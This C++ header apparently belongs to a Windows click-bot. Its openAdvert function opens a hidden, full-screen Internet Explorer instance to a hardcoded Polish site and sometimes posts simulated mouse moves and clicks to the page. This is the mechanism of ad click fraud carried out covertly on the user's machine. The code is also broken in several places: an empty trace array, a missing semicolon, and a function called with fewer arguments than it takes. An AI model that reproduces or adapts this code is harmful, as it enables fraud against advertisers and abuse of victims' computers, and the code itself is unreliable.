#pragma once

IWebBrowser2* browsers[ 256 ];
int currentBrowser = 0;

IConnectionPoint* connectPoint;
BSTR bstrURL;
IWebBrowser2*    pBrowser2;
DWORD cookie;

bool endBrowser = false;


BOOL CALLBACK EnumChildProc( HWND hwnd , LPARAM lparam ){
	char szClassName[ 256 ];

	GetClassName( hwnd , szClassName , sizeof( szClassName ) );

	if( strcmp( szClassName , "Internet Explorer_Server" ) != 0 ){
		return TRUE;
	}

	int mouseTrace[] = { };

	int type , time , x , y;

    for(int i = 0; mouseTrace[i] >= 0; i+=4) {
        type = mouseTrace[i]; time = mouseTrace[i+1];
        x = mouseTrace[i+2]; y = mouseTrace[i+3];

        Sleep( time );

        if(type == MOUSE_MOVE)
            mouseMove( hwnd , x, y);
        else if(type == MOUSE_CLICK)
            mouseClick( hwnd , x, y);
    }

	/*RECT windowRect;

	GetWindowRect( hwnd , &windowRect );

    for( int i = 0 ; i < 2 ; i++ ){
       	int positionX = ( ( std::rand() ) % ( windowRect.right - windowRect.left ) ) + windowRect.left;
		int positionY = ( ( std::rand() ) % ( windowRect.bottom - windowRect.top ) ) + windowRect.top;

		PostMessage( hwnd , WM_MOUSEMOVE , 0 , MAKELPARAM(positionX,positionY) );

		Sleep( ( std::rand() % 300 ) + 300 );

       	PostMessage( hwnd, WM_LBUTTONDOWN, 0, MAKELPARAM(positionX,positionY) );
        Sleep( ( std::rand() % 200 ) + 200 );
        PostMessage ( hwnd, WM_LBUTTONUP, 0, MAKELPARAM(positionX,positionY) );

        Sleep( ( std::rand() % 1000 ) + 1000 );
   }*/

   return FALSE;
}

DWORD WINAPI openAdvert( PVOID pvParam ){
	if (SUCCEEDED(OleInitialize(NULL))){

   		CoCreateInstance(CLSID_InternetExplorer, NULL, CLSCTX_LOCAL_SERVER,
                       IID_IWebBrowser2, (void**)&pBrowser2);
   		if (pBrowser2){
       		VARIANT vEmpty;
       		VariantInit(&vEmpty);

       		bstrURL = SysAllocString(L"http://cssetti.pl/");

       		HRESULT hr = pBrowser2->Navigate(bstrURL, &vEmpty, &vEmpty, &vEmpty, &vEmpty);
       		if (SUCCEEDED(hr))
       		{
           		pBrowser2->put_Visible( VARIANT_FALSE );
           		pBrowser2->put_FullScreen( VARIANT_TRUE );
       		}
       		else
       		{
           		pBrowser2->Quit();

           		SysFreeString(bstrURL);

           		OleUninitialize();

           		return 0;
       		}

       		srand( time( NULL ) );

       		Sleep( ( std::rand() % 5000 ) + 5000 );

       		if(std::rand() % 100 > 14 ){
       			pBrowser2-> Quit();

       			SysFreeString(bstrURL);
       			pBrowser2 -> Release();

       			OleUninitialize();

       			return 0;
       		}

       		HWND handle;

       		if( pBrowser2 -> get_HWND( ( long *)&handle ) !=  S_OK ){
       			pBrowser2-> Quit();

       			SysFreeString(bstrURL);
       			pBrowser2 -> Release();

       			OleUninitialize();

       			return 0;
       		}

       		IConnectionPointContainer* pServiceProvider2 = NULL;

       		BrowserEvents eventsHandle;

			if (SUCCEEDED(pBrowser2->QueryInterface(IID_IConnectionPointContainer, (void**)&pServiceProvider2))){

				hr = pServiceProvider2 -> FindConnectionPoint( DIID_DWebBrowserEvents2  , &connectPoint );

				if( SUCCEEDED( hr ) ){
						hr = connectPoint -> Advise( &eventsHandle , &cookie );

						if(	FAILED( hr ) ){
							pServiceProvider2 -> Release();

							connectPoint -> Unadvise( cookie );

							pBrowser2-> Quit();

 							SysFreeString(bstrURL);
       						pBrowser2 -> Release();

       						OleUninitialize();

       						return 0;
						}
				}

				pServiceProvider2 -> Release();
			}

			IServiceProvider* pServiceProvider = NULL;

			if (SUCCEEDED(pBrowser2->QueryInterface(IID_IServiceProvider, (void**)&pServiceProvider))){
    			IOleWindow* pWindow = NULL;

				if (SUCCEEDED(pServiceProvider->QueryService(
                    SID_SShellBrowser,
                    IID_IOleWindow,
                    (void**)&pWindow))){

						HWND hwndBrowser = NULL;

						if (SUCCEEDED(pWindow->GetWindow(&hwndBrowser))){
							EnumChildWindows( hwndBrowser ,EnumChildProc , 0 );
       					}

        			pWindow->Release();
    			}

    			pServiceProvider->Release();

			}

			#if defined DEBUG
			logToFile( "On exit threads advert" );
			#endif

            endBrowser = true;

			return 0;
	 }

   		OleUninitialize();
	}
}

void exitBrowser(){
    if( !endBrowser ){
        return;
    }

    connectPoint -> Unadvise( cookie );

    pBrowser2-> Quit();

    SysFreeString(bstrURL);
    pBrowser2 -> Release();

    for( int iPosition = 0 ; iPosition <  currentBrowser ; iPosition++ ){
        browsers[ iPosition ] -> Quit();
        browsers[ iPosition ] -> Release();
    }

    OleUninitialize();
}

void mouseMove( HWND hwnd , DWORD x, DWORD y) {
    PostMessage(hwnd, WM_MOUSEMOVE, 0, MAKELPARAM((short)x, (short)y))
}

void mouseClick( HWND hwnd , DWORD x, DWORD y , int time ) {
    PostMessage(hwnd, WM_LBUTTONDOWN, 0, MAKELPARAM((short)x, (short)y));
    Sleep( time );
    PostMessage(hwnd, WM_LBUTTONUP, 0, MAKELPARAM((short)x, (short)y));
}
